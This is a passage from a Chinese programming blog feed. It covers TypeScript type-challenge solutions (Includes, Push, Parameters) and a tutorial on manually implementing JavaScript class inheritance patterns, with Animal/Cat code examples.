class="keyword">in</span> T[<span class="built_in">number</span>]]: <span class="literal">true</span></span><br><span class="line">&#125;[U] <span class="keyword">extends</span> <span class="literal">true</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>当然，在 JavaScript 中以这种方式实现的 includes 方法不不能判断引用类型的值，我们在将引用类型的值作为对象的 Key 时，会被字符串化，如 <code>&#123;a: 123&#125;</code> 会被字符串化为 <code>&#123;[object Object]: true&#125;</code>。</p><p>相同的，在类型声明中，上面我们实现的 Includes 工具类型只能处理 <code>1</code>、<code>2</code> 、<code>&#39;a&#39;</code> 这种基本类型，遇到函数类型、interface、boolean 这样的类型则会直接跳过，不会作为 key 值写入到生成的 interface 中。面对 <code>Includes&lt;[&#123; a: &#39;A&#39; &#125;], &#123; a: &#39;A&#39; &#125;&gt;</code>、<code>Includes&lt;[false, 2, 3, 5, 6, 7], false&gt;</code> 这样的用例时无法正常处理，获取到的都是 <code>false</code>，而对于 <code>Includes&lt;[1 | 2], 1&gt;</code> 这样包含了这种由基础类型构成的联合类型的用例，内部会转化为 <code>&#123;1: true, 2: true&#125;</code>，因此结果会变为 <code>true</code>。</p><p>上面两种方式都没法满足我们的目标，我们继续思考，如果可以解决<strong>如何在 TypeScript 中准确判断两个类型是否相同</strong>、<strong>并且在类型声明中可以进行遍历操作</strong>，这样只要遍历元组中的每个元素是否与目标元素相同，就可以得出目标元素是否包含在元组中的结果了。</p><p>关于解决判断类型是否相同，我们编写一个 <code>IsEqual</code> 工具类，其来源可以查看<a href="https://github.com/microsoft/TypeScript/issues/27024#issuecomment-421529650">这里</a>，通过该工具类可以查看类型是否相同，实现如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">IsEqual</span>&lt;X, Y&gt; =</span><br><span class="line">    (&lt;T&gt;<span class="function">() =&gt;</span> T <span class="keyword">extends</span> X ? <span class="number">1</span> : <span class="number">2</span>) <span class="keyword">extends</span></span><br><span class="line">    (&lt;T&gt;<span class="function">() =&gt;</span> T <span class="keyword">extends</span> Y ? <span class="number">1</span> : <span class="number">2</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>对于遍历操作，TypeScript 中虽然不能使用 for 循环，但是可以使用 <code>extends</code> 进行条件判断，并且可以调用自身的类型声明，因此我们可以使用递归的方式实现遍历：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Includes</span>&lt;<span class="title class_">Value</span> <span class="keyword">extends</span> <span class="built_in">any</span>[], <span class="title class_">Item</span>&gt; =</span><br><span class="line"><span class="title class_">IsEqual</span>&lt;<span class="title class_">Value</span>[<span class="number">0</span>], <span class="title class_">Item</span>&gt; <span class="keyword">extends</span> <span class="literal">true</span></span><br><span class="line">? <span class="literal">true</span></span><br><span class="line">: <span class="title class_">Value</span> <span class="keyword">extends</span> [<span class="title class_">Value</span>[<span class="number">0</span>], ...infer <span class="title class_">Rest</span>]</span><br><span class="line">? <span class="title class_">Includes</span>&lt;<span class="title class_">Rest</span>, <span class="title class_">Item</span>&gt;</span><br><span class="line">: <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>我们已经接近标准答案了，但是上面的实现无法处理 <code>Includes&lt;[null], undefined&gt;</code> 这个用例，解决这个也并不复杂，我们只需要在递归前进行一个非空检查，如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Includes</span>&lt;<span class="title class_">Value</span> <span class="keyword">extends</span> <span class="built_in">any</span>[], <span class="title class_">Item</span>&gt; =</span><br><span class="line">  <span class="title class_">Value</span> <span class="keyword">extends</span> [<span class="title class_">Value</span>[<span class="number">0</span>], ...infer <span class="title class_">Rest</span>]</span><br><span class="line">    ? <span class="title class_">IsEqual</span>&lt;<span class="title class_">Value</span>[<span class="number">0</span>], <span class="title class_">Item</span>&gt; <span class="keyword">extends</span> <span class="literal">true</span> ? <span class="literal">true</span> : <span class="title class_">Includes</span>&lt;<span class="title class_">Rest</span>, <span class="title class_">Item</span>&gt;</span><br><span class="line">    : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h2 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h2><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/03057-easy-push/README.zh-CN.md">Source</a></p><p>在类型系统里实现通用的 <code>Array.push</code> 。</p><p>例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">Push</span>&lt;[<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;3&#x27;</span>&gt; <span class="comment">// [1, 2, &#x27;3&#x27;]</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Push</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[], U&gt; = [...T, U]</span><br></pre></td></tr></table></figure><p>相同题目 <a href="https://github.com/type-challenges/type-challenges/blob/main/questions/03060-easy-unshift/README.zh-CN.md#unshift--">Shift</a> 不再记录。</p><h2 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h2><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/03312-easy-parameters/README.zh-CN.md">Source</a></p><p>TypeScript 内置工具类型 Parameters 可以提取函数的参数类型。</p><p>例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="variable constant_">T2</span> = <span class="title class_">Parameters</span>&lt;<span class="function">(<span class="params">arg: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">any</span>&gt;; <span class="comment">// [arg: string]</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Arg</span> = <span class="variable constant_">T2</span>[<span class="number">0</span>] <span class="comment">// string</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typescript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动实现 JavaScript 类的继承</title>
      <link href="/2024/01/9149c021f802.html"/>
      <url>/2024/01/9149c021f802.html</url>
      
        <content type="html"><![CDATA[<h1 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h1><p>这个实现方式是将子类的 prototype 直接指向一个实例化好的父类，这样当实例化后的子类查找属性或方法时，就能通过这个实例化好的父类拿到父类构造函数（在 prototype 上的）的属性或方法。</p><p>实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name || <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">eat</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params">age</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age || <span class="title class_">NaN</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 原型链继承</span></span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&#x27;2 month&#x27;</span>);</span><br><span class="line"><span class="comment">// 调用父级构造函数中的方法</span></span><br><span class="line">cat.<span class="title function_">eat</span>();</span><br><span class="line">cat.<span class="title function_">bark</span>();</span><br><span class="line"><span class="comment">// 输出属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: cat.<span class="property">name</span>,</span><br><span class="line">  <span class="attr">age</span>: cat.<span class="property">age</span>,</span><br><span class="line">&#125;); <span class="comment">// &#123; name: &#x27;unknown&#x27;, age: &#x27;2 month&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">constructor</span>); <span class="comment">// [Function: Animal]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Cat</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>当生成的 cat 实例尝试调用 eat 方法时，会首先查找自身有没有该属性，如果没有，沿原型链进行查找到 Cat 构造函数上的 prototype 属性上。由于我们实例化了一个 Animal 的实例挂载到了 Cat 的 prototype 上，因此当 cat 查找 Cat 构造函数上的 prototype 时，可以拿到 Animal 实例上的所有属性和方法，也就是说可以获取到 Animal.prototype，这样也就完成了继承。</p><p>优点：</p><ul><li>实现方便</li><li>instanceof 方法可以判断继承<ul><li><code>cat.__proto__.__proto__ === Animal.prototype</code> 为 <code>true</code></li><li><code>Cat.__proto__ === Animal</code> 为 <code>false</code>（与 ES6 继承不统一）</li></ul></li></ul><p>缺点：</p><ul><li>所有子类都共享同一个父类的实例</li><li>当父类构造函数有参数时，实例化之类时不能向父类传参，也就是 <code>super</code> 操作无法实现</li><li>无法实现多继承</li><li>prototype 被覆写，很多属性的指向将会是错误的，如 <code>constructor</code></li></ul><blockquote><p>[[面试中遇到的高频问题整理#new 一个对象发生了什么]]</p></blockquote><h1 id="构造函数继承"><a href="#构造函数继承" class="headerlink" title="构造函数继承"></a>构造函数继承</h1><p>这种继承方式强行将父类构造函数中的所有属性都绑定给实例化后的子类实例，从而让子类继承了父类的属性。</p><p>实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name || <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">eat</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age || <span class="title class_">NaN</span>;</span><br><span class="line">  <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;YiDianDian&quot;</span>,<span class="string">&quot;2 month&quot;</span>);</span><br><span class="line"><span class="comment">// 调用父级构造函数中的方法</span></span><br><span class="line">cat.<span class="title function_">eat</span>();</span><br><span class="line">cat.<span class="title function_">bark</span>();</span><br><span class="line"><span class="comment">// 输出属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: cat.<span class="property">name</span>,</span><br><span class="line">  <span class="attr">age</span>: cat.<span class="property">age</span>,</span><br><span class="line">&#125;); <span class="comment">// &#123; name: &#x27;YiDianDian&#x27;, age: &#x27;2 month&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">constructor</span>); <span class="comment">// [Function: Cat]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Cat</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>优点：</p><ul><li>避免了所有子类上的属性被共享</li><li>实例化子类时可以向父类的构造函数传参</li></ul><p>缺点：</p><ul><li>没有考虑原型链，隐式原型的指向是错的，所以 instanceof 不生效</li><li>父类的方法如果想要被继承，都必须挂载在 <code>this</code> 上，通过 <code>prototype</code> 挂载的是无法被实例化后的子类访问的，且父类所有的方法都在构造函数中声明的话每次实例化都会被重新创建，无法复用</li></ul><h1 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name || <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">eat</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age || <span class="title class_">NaN</span>;</span><br><span class="line">  <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;YiDianDian&quot;</span>, <span class="string">&quot;2 month&quot;</span>);</span><br><span class="line">cat.<span class="title function_">eat</span>();</span><br><span class="line">cat.<span class="title function_">bark</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: cat.<span class="property">name</span>,</span><br><span class="line">  <span class="attr">age</span>: cat.<span class="property">age</span>,</span><br><span class="line">&#125;); <span class="comment">// &#123; name: &#x27;YiDianDian&#x27;, age: &#x27;2 month&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">constructor</span>); <span class="comment">// [Function: Animal]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Cat</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>优点：</p><ul><li>可以继承实例属性、方法，也可以继承原型属性、方法</li><li>可传参、可复用</li><li>实例既是子类的实例，也是父类的实例</li></ul><p>缺点：</p><ul><li>调用了两次父类构造函数，耗内存</li><li>需要修复构造函数指向</li></ul><h1 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h1><p>直接将新的实例的隐式原型指向超类，就能通过原型链拿到超类的方法和属性。</p><p>实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> animal = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">  <span class="title function_">eat</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = &#123;&#125;;</span><br><span class="line">cat.<span class="property">__proto__</span> = animal;</span><br><span class="line"></span><br><span class="line">cat.<span class="property">age</span> = <span class="string">&quot;2 month&quot;</span>;</span><br><span class="line">cat.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">cat.<span class="title function_">eat</span>();</span><br><span class="line">cat.<span class="title function_">bark</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: cat.<span class="property">name</span>,</span><br><span class="line">  <span class="attr">age</span>: cat.<span class="property">age</span>,</span><br><span class="line">&#125;); <span class="comment">// &#123; name: &#x27;unknown&#x27;, age: &#x27;2 month&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(cat instanceof Animal);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">constructor</span>); <span class="comment">// [Function: Object]</span></span><br><span class="line"><span class="comment">// console.log(cat.__proto__.__proto__ === Animal.prototype);</span></span><br><span class="line"><span class="comment">// console.log(Cat.__proto__ === Animal);</span></span><br></pre></td></tr></table></figure><p>优化：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">object</span>(<span class="params">proto</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Fn</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line">  <span class="title class_">Fn</span>.<span class="property"><span class="keyword">prototype</span></span> = proto;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Fn</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> animal = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">  <span class="title function_">eat</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="title function_">object</span>(animal);</span><br><span class="line">cat.<span class="property">age</span> = <span class="string">&quot;2 month&quot;</span>;</span><br><span class="line">cat.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>优化：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> animal = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">  <span class="title function_">eat</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="title class_">Object</span>.<span class="title function_">create</span>(animal);</span><br><span class="line"></span><br><span class="line">cat.<span class="property">age</span> = <span class="string">&quot;2 month&quot;</span>;</span><br><span class="line">cat.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h1><p>只是将原型式继承创建了一个工厂函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> animal = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">  <span class="title function_">eat</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createCat</span>(<span class="params">age</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> newInstance = <span class="title class_">Object</span>.<span class="title function_">create</span>(animal);</span><br><span class="line">  newInstance.<span class="property">age</span> = age;</span><br><span class="line">  newInstance.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> newInstance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="title function_">createCat</span>(<span class="string">&quot;2 month&quot;</span>);</span><br><span class="line"></span><br><span class="line">cat.<span class="title function_">eat</span>();</span><br><span class="line">cat.<span class="title function_">bark</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: cat.<span class="property">name</span>,</span><br><span class="line">  <span class="attr">age</span>: cat.<span class="property">age</span>,</span><br><span class="line">&#125;); <span class="comment">// &#123; name: &#x27;unknown&#x27;, age: &#x27;2 month&#x27; &#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>实现 Object.create：[[面试中遇到的高频问题整理#实现 Object.create]]</p></blockquote><h1 id="寄生组合式继承"><a href="#寄生组合式继承" class="headerlink" title="寄生组合式继承"></a>寄生组合式继承</h1><p>组合式继承其实已经是一个比较完善的类继承方案了，但是缺点是会实例化两次 super 类。为了解决这个问题，我们可以使用寄生式组合的方法去连接子类与 Super 类之间的原型链，从而优化掉组合式继承中为了连接原型链而进行的第二次实例化。</p><p>实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 